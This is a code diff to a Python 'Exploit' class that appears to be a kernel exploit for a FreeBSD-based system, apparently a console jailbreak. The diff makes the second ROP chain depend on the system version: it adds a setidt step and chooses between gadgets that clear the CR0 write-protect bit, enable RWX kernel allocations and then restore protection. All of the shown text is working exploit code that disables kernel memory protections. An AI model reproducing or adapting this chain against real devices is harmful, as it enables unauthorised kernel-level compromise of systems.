@@ -628,24 +628,28 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
 
-        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
-        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
-        rop += p64(IDT_UD)
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(SDT_SYSIGT)
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(SEL_KPL)
-        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
-        rop += p64(0)
-        rop += p64(0xDEADBEEF)
-        rop += p64(self.kdlsym(self.offs.SETIDT))
+        if (self.sys_ver >= 650):
+            # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
+            rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+            rop += p64(IDT_UD)
+            rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+            rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
+            rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+            rop += p64(SDT_SYSIGT)
+            rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+            rop += p64(SEL_KPL)
+            rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+            rop += p64(0)
+            rop += p64(0xDEADBEEF)
+            rop += p64(self.kdlsym(self.offs.SETIDT))
 
         # Disable write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI & ~CR0_WP)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # Enable RWX in kmem_alloc
         rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
@@ -660,7 +664,10 @@ class Exploit():
         # Restore write protection
         rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
         rop += p64(CR0_ORI)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        if (self.sys_ver >= 650):
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+        else:
+            rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_MOV_EAX_1_RET))
 
         # kmem_alloc(*kernel_map, PAGE_SIZE)
 
